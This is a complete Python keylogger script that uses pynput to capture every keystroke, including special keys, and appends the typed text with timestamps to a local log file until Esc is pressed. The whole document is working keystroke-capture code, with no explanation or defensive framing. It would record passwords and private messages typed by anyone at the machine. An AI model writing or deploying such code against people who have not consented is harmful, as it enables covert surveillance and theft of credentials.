from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"
current_text = ""  # Store the ongoing text

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        f.write(timestamp + text + "\n")

def on_press(key):
    global current_text
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_text += key.char  # Add normal characters
        else:
            if key == keyboard.Key.space:
                current_text += " "
            elif key == keyboard.Key.enter:
                write_log(current_text)  # Save full sentence
                current_text = ""
            elif key == keyboard.Key.backspace:
                current_text = current_text[:-1]  # Remove last char
            else:
                current_text += f" [{key.name}] "  # Other special keys

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        if current_text:  # Save any unsaved text
            write_log(current_text)
        return False  # Stop the listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
